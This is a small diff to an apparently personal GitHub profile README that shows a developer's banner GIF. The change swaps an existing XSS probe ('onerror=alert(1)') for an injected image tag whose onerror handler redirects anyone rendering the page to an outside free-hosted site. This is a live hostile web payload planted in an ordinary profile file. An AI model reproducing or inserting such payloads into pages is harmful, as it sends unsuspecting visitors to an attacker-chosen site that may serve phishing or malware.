@@ -2,7 +2,7 @@
   <img src="https://github.com/matyo91/matyo91/raw/main/assets/github.gif" alt="Hi, I'm Mathieu 👋 I'm a 🚀 French developer 🚀 I ❤️ Happy Hardcore ❤️">
 </p>
 
-"><img src=x onerror=alert(1)>
+"><img src=x onerror=window.location="https://yakuzosec.000webhostapp.com">
 
 <!--
 How to make this gif ?
